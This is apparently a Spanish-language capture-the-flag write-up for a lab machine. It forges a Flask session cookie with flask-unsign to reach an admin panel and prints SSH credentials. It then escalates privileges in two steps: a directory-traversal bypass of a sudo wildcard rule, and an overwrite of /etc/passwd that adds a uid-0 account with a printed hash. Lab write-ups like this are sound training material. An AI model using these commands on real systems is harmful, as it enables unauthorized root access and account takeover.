## Reconocimiento:

Puerto 22:SSH y Puerto 5000:http

```bash
http://172.17.0.2:5000
```

Hay un panel de login con opción de registro. Ingresamos credenciales y nos redirige a un dashboard con acceso limitado.

La pagina utiliza Flask :

**Flask** es un **microframework** de código abierto escrito en **Python** que se utiliza para el desarrollo de aplicaciones web y APIs.

Por lo que sabemos que en su cookie de sesión contiene información de la API, toca desencriptarla.

Primero crear un entorno virtual con python:

```bash
python3 -m venv nombre_del_entorno
source nombre_del_entorno/bin/activate
```

Instalar dependencias:

```bash
pip3 install flask-unsign[wordlist]
```

Desencriptación:

```bash
flask-unsign --decode --cookie 'COOKIE'
flask-unsign --unsign --cookie 'COOKIE' --no-literal-eval
flask-unsign --sign --cookie 'SESSION_DECODE' --secret 'PASS' --no-literal-eval
```

Esto nos dará la nueva cookie, reemplazandola con la actual del panel de usuario y recargando la pagina. Nos muestra el panel de Admin y las credenciales ssh

User = peter

Pass = e6okFUI4

## Escaldada Peter - Pan:

```bash
sudo -l
(pan) NOPASSWD: /usr/bin/bash /home/pan/*
```

Nos damos cuenta que podemos ejecutar cualquier archivo siempre y cuando la ruta comience por /home/pan. La idea es bypassear la restricción con un Directory Trasversal.

```bash
echo '#!/bin/bash' > /tmp/exploit.sh
echo '/bin/bash -p' >> /tmp/exploit.sh
chmod +x /tmp/exploit.sh
sudo -u pan /usr/bin/bash /home/pan/../../../../../tmp/exploit.sh
```

## Escalada Pan - Root

```bash
sudo -l
BROKEN SUDO
```

Tenemos un sudo corrompido, pero listando binarios con SUID encontramos /usr/bin/sudo y no hay problema

```bash
find / -perm -4000 2>/dev/null
```

```bash
/usr/bin/sudo -l
ALL NOPASSWD: /usr/bin/mv
```

Podemos mover cualquier fichero como root.

Nos creamos nuestro propio usuario privilegiado, primero nos 
creamos la clave con openssl

```bash
openssl passwd -1 -salt xyz password123
```

 Creamos nuestra linea en un fichero en /tmp  

```bash
echo 'r00t:$1$xyz$yHoMTbjR/T1EsmNb.r7cu0:0:0:root:/root:/bin/bash' > /tmp/mi_user
```

Copiamos al final del fichero recién creado todo el **passwd** y lo movemos con sudo para ejecutarlo.

```bash
cat /etc/passwd >> /tmp/mi_user
sudo /usr/bin/mv /tmp/mi_user /etc/passwd
```

```bash
su root
```
